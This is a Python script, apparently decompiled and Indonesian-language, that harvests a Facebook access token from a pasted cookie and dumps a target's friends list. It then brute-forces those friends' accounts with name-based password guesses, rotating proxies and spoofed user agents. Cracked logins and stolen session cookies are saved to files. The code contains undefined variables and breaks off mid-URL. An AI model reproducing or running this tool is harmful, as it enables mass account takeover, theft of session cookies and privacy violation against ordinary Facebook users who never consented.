#decompile by spTzy ðŸ”¥
#thanks to all support

###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform,rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from time import time as TimeTegar
from rich.tree import Tree
from rich.table import Table as me
from rich import print as prints
from rich.markdown import Markdown as mark
from rich.console import Console
from rich.columns import Columns
from bs4 import BeautifulSoup as parser
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
hp = platform.platform()

###----------[ GLOBAL NAMA ]----------###
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
akunyeh = []
akun = []
usragent = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
af = 0
pwpluss,pwnya=[],[]
ualu,ualuh = [],[]

###----------[ USER AGEN]----------###
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('prox.txt','w').write(prox)
except Exception as e:
	baz_anim(f'gagal ster :(')
prox=open('prox.txt','r').read().splitlines()
for xd in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	kontol1=random.choice(['SAMSUNG SM-J210Y','SAMSUNG SM-E203Y','SAMSUNG SM-T87V','SAMSUNG SM-D738P','SAMSUNG SM-W748D','SAMSUNG SM-Z794M','SAMSUNG SM-K144T','SAMSUNG SM-L372N','SAMSUNG SM-B588T','SAMSUNG SM-R584V','SAMSUNG SM-R108Z'])
	nanya2='Mozilla/5.0 (Linux; Android {a}; {kontol1}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku = random.choice([nanya2])
	ugen2.append(uaku)

for t in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P'])
	random2=random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6816D'])
	random3=random.choice(['CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501'])
	random4=random.choice(['Xiaomi 10 Pro','2201123G','2203129G','2201122G','2206122SC','2203121C','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro'])
	random5=random.choice(['vivo 1002T','Vivo 1605','vivo 1914','vivo 2019','vivo 2023','vivo 2027','Vivo 6','Vivo 93K Prime','V2242A','V2227A','vivo 1918'])
	random6=random.choice(['OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f'])
	random7=random.choice(['Nokia 1','Nokia 1 Plus','Nokia 1011','Nokia C01','Nokia C1 2nd Edition','Nokia C20','Nokia C20 Plus','Nokia C21','Nokia C21 Plus','Nokia C3'])
	random8=random.choice(['21061119DG','21121119VL','220233L2G','220333QL','M2004J15SC','M2004J7BC','Redmi 11 Lite','Redmi 1S','Redmi 9 Pro','Redmi Note 9 Pro'])
	random9=random.choice(['M2006C3MI','22031116AI','220333QPG','POCO F2 Pro','M2012K11AG','M2104K10I','22021211RG','21121210G','M2004J19PI','POCO M2 Pro'])
	random10=random.choice(['WOW64'])
	demias1=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias2=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias3=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias4=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias5=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias6=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias7=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias8=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias9=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	demias10=f'Mozilla/5.0 (Linux; Android 10; JANDA BOHAY AH AH AH AH Build300k/AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3'
	uaku2 = random.choice([demias1,demias2,demias3,demias4,demias5,demias6,demias7,demias8,demias9,demias10])
	ugen.append(uaku2)
	
###----------[ PEWARNA ]----------###
M = '\033[1;31m' # MERAH
K = '\033[1;33m' # KUNING
H = '\033[1;32m' # HIJAU
B = '\033[1;34m' # BIRU TUA
U = '\033[1;35m' # UNGGU
P = '\033[1;37m' # PUTIH
O = '\033[1;36m' # BIRU MUDA
A = '\x1b[1;90m'  # ABU-ABU
N = '\33[m' # WARNA MATI
        
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
afh = 'A2F-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	print(f'''
 {H}â•­â”€â”€â•® REZAXD â•­â”€â•®   {N}: Pake Seadanya
 {M}â”œâ”€â”€â”‚â•­â”¬â•®â•­â”€â”€â•®â”‚â”‚â”‚â•­â•®  {N}: Reza XD
 {O}â”‚â”€â”€â”¤â”œâ”‚â”¤â”‚â”‚â”‚â”‚â”‚â•­â•¯â”‚â•°â•® {N}: {H}Jangan Di Prem,kan
 {K}â•°â”€â”€â•¯â•°â”´â•¯â•°â”´â”´â•¯â•°â•¯ â•°â”€â•¯ {N}: {P}Recode : Snifer\n {N}â‰ =====================================â‰ ''')

###----------[ BAGIAN LOGIN COKIS ]----------###
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
ses = requests.Session()
def login_lagi334():
	os.system('clear')
	banner()
	print('')
	cok = input(f'{P}Masukkan cookie :{H} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {M}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n {P}Token : {H}{took}')
				exit()
	except Exception as e:
		print(e)
###----------[ BAGIAN MENU ]----------###
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[Ã—] Cookies Kadaluarsa ')
		time.sleep(1)
		login_lagi334()
	os.system('clear')
	banner()
	print(f' {N}[{O}*{N}]{P} User Name : {K}{my_name}\n {N}[{O}*{N}]{P} Joined : {H}{tg}/{bl}/{th}')
	print(f' {N}â‰ =====================================â‰ ')
	print(f' {N}[{B}1{N}]{P} Crack publik')
	print(f' {N}[{B}2{N}]{P} Result {H}ok{A}/{K}cp')
	print(f' {N}[{M}0{N}]{P} Logout {M}Cookie{N}')
	print(f' â‰ =====================================â‰ ')
	helpbas = input(f'{N} Pilih : ')
	print(f' â‰ =====================================â‰ ')
	if helpbas in ['1','01','001']:
		idt = input(f' {N}[{H}âˆš{N}] {P}Masukan uid : {K}')
		dump(idt,"",{"cookie":cok},token)
		atur_dulu()
	elif helpbas in ['2','02','002']:
		result()
	elif helpbas in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{N} Success logout')
		exit()
	else:
		exit()

###----------[ DUMP ID PUBLIK ]----------###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r {N}[{H}âˆš{N}] {P}Sedang dump uid : {H}{len(id)}{N} "),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

###---------- [ RESULT AKUN ] -----------###
def result():
	print(f'[!] 1. Hasil {H}OK{N} Anda ')
	print(f'[!] 2. Hasil {K}CP{N} Anda ')
	print('[!] 3. Kembali	')
	rohman_ganteng = input(f'\n[?] Pilih : ')
	if rohman_ganteng in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ({K} %s {N}Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{N}{K}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ( {H}%s{N} Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f' %s. %s ({H} %s {N}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[â€¢] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{N}{H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['3']:
		back()
	else:
		print('[!] Pilih Yang Bener  ')
		back()
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'\n â‰ =====================================â‰ ')
	print(f' {N}[{P}1{N}] {M}Old    {N}[{P}2{N}] {K}New    {N}[{P}3{N}] {H}Random{N}')
	print(f' â‰ =====================================â‰ ')
	aturid = input(f'{N} Choose : ')
	print(f' â‰ =====================================â‰ ')
	if aturid in ['1','01']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		waktu(1)
		atur_dulu()
		exit()
		

	print(f' {N}[{O}1{N}]{H} mobile     {N}[{O}2{N}]{H} validate{N}')
	print(f' â‰ =====================================â‰ ')
	metod = input(f'{N} Choose : ')
	print(f' â‰ =====================================â‰ ')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('validate')
	elif metod in ['3','03']:
	    baz.append('validate2') 
	else:
		baz.append('metod1')
		
	pwplus=input(f' {N}[{M}*{N}]{P} Mau Nambah PW Manual ? y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'{P} PW Manual Menimal 6 Hurup\n Contoh : {M}kuntul,panjang')
		pwku=input(f'{O} Masukan PW : {H}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
	print(f' {N}â‰ =====================================â‰ ')
	uatambah= input(f' {N}[{M}*{N}]{P} Tambah UA Manual ? y/t : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		anjai = input(f'{P} Masukan UA : {U}')
		ualu.append(anjai)
	else:
		ualuh.append('tidak')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global prog,des
	print(f' {N}â‰ =====================================â‰ ')
	print(f' {P}acun {H}ok {P}save di : {H}{okh}\n {P}acun {K}cp {P}save di : {K}{cph}{N}')
	print(f' â‰ =====================================â‰ ')
	print(f'{N}')
	awal = datetime.datetime.now()
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['bagong','sayang','jancok']
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'07')
				if '><v><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metod1' in baz:
					gas_krek.submit(metod1,idf,pwv,awal)
				elif 'validate' in baz:
					gas_krek.submit(crackvalidate,idf,pwv,awal)
				elif 'validate2' in baz:
					gas_krek.submit(crackvalidate,idf,pwv,awal)
              else:
					gas_krek.submit(metod1,idf,pwv)
		print(f'{N}')
		print(f'{H}+ {P}Akun OK  : {H}%s{N} '%(ok))
		print(f'{K}+ {P}Akun CP  : {K}%s{N} '%(cp))
		print(f'{N}')
		
###--------- [ METHODE ] ----------###
def crackvalidate(idf,pwv,awal):
	global loop,ok,cp
	ahir = str(datetime.datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r[bold cyan]{ahir} [bold purple][[bold green]OK[bold white]:[bold green]{ok}{M}/[bold yellow]CP[bold white]:[bold yellow]{cp}[purple]] [bold white]{loop}[bold red]/[bold white]{len(id)} ")
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_a10kr8rx%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D71859130-d0b0-41d9-b565-a085cf680d74%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_a10kr8rx%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v9.0/dialog/oauth?cct_prefetching=0&client_id=630498417018811&cbt=1661507220450&e2e=%7B%22init%22%3A1661507220450%7D&ies=1&sdk=android-9.1.1&sso=chrome_custom_tab&scope=public_profile&state=%7B%220_auth_logger_id%22%3A%22764e6ea0-aa1b-451d-920e-95937478ee2d%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22f6gsgbutu56c1kim0hue%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.naver.linewebtoon&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=764e6ea0-aa1b-451d-920e-95937478ee2d&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r{A}[{K}CP{A}] {K}{idf} | {pw} {M}~ {B}{tahun(idf)}{N}")
				open('CP/'+cph,'a').write(f'{idf}|{pw}\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{A}[{H}OK{A}] {H}{idf} | {pw} {M}~ {B}{tahun(idf)}{N}")
				print(f"\r{H}{kuki}{N}")
				open('OK/'+okh,'a').write(f'{idf}|{pw}|{kuki}')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

###----------[ METODE ]----------###
resok = []
rescp = []
def metod1(idf,pwv,awal):
	global loop,ok,cp
	ahir = str(datetime.datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r[bold cyan]{ahir} [bold purple][ [bold green]{ok}{mer}/[bold yellow]{cp} [purple]] [bold white]{loop}[bold red]/[bold white]{len(id)} ")
	prog.advance(des)
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen1)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=3618539641590455&kid_directed_site=0&app_id=3618539641590455&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2B